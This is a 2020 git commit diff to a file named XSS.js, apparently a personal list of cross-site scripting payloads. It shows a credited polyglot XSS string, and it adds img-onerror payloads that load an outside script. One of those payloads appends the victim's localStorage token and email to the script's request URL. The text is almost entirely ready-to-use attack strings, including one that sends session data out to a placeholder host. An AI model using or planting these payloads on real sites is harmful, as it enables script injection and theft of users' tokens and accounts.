8727a8863b4a60fe5f6e70439696676a458e1aed
Steven Jenkins <45439182+SJ-Hydra@users.noreply.github.com>
2020-02-14 13:36:49 -0500

    Update XSS.js

--- XSS.js
+++ XSS.js
@@ -17,3 +17,10 @@ javascript:alert(6)
 
 // Polyglot -- Credit: 0xSobky/HackVault 
 jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(2)//>\x3e
+
+
+// Payloads
+<img src onerror=alert(decodeURIComponent("URL Encoded String"))>
+<img src=1 onerror="document.head.appendChild(document.createElement('script')).src='http://127.0.0.1/script.js'">
+<img src=1 onerror="document.head.appendChild(document.createElement('script')).src=’http://127.0.0.1/script.js?c='+localStorage.token + localStorage.email">
+
